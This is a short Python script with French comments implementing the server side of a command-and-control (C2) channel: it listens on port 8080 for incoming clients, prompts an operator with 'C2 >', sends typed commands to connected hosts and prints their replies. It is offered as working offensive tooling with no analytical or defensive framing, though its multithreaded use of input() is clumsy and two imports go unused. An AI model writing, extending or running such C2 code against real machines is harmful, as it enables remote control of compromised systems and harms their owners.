import socket
import threading
import http.server
import socketserver

# Configuration du serveur
HOST = '0.0.0.0'  # Accepter les connexions sur toutes les interfaces réseau
PORT = 8080       # Port à écouter

# Liste des clients connectés
clients = []

# Fonction pour gérer les commandes du serveur
def handle_client(client_socket, client_address):
    print(f"[+] Nouveau client connecté: {client_address}")
    clients.append(client_socket)

    try:
        while True:
            # Demande de commande à l'utilisateur (serveur)
            command = input("C2 > ")

            # Si 'exit' est entré, on ferme la connexion avec le client
            if command.lower() == "exit":
                break

            # Envoyer la commande au client
            client_socket.send(command.encode())

            # Recevoir la réponse du client
            response = client_socket.recv(1024).decode()
            print(f"[{client_address}] {response}")
    except Exception as e:
        print(f"[-] Erreur: {e}")
    finally:
        print(f"[-] Déconnexion du client {client_address}")
        client_socket.close()
        clients.remove(client_socket)

# Fonction pour démarrer le serveur et accepter les connexions
def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(f"[+] Serveur C2 démarré sur {HOST}:{PORT}")

    while True:
        client_socket, client_address = server_socket.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_handler.start()

if __name__ == "__main__":
    start_server()
